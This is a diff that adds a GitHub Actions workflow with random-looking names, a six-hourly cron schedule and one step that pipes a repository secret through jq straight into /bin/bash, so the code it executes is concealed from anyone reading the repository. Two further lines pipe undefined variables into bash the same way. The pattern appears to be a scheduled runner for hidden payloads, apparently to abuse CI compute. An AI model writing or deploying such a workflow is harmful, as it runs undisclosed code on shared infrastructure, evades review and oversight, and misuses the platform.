@@ -1,0 +1,20 @@
+name: zhaozilong7182
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaozilong7182
+        env:
+          a5708: ${{ secrets.a5708 }}
+        run: |
+          echo $a5708 | jq -r .iyr63 | /bin/bash
+          echo $ufw634 | jq -r .dasn811 | /bin/bash
+          echo $ifqqn35762 | jq -r .atp536 | /bin/bash
+
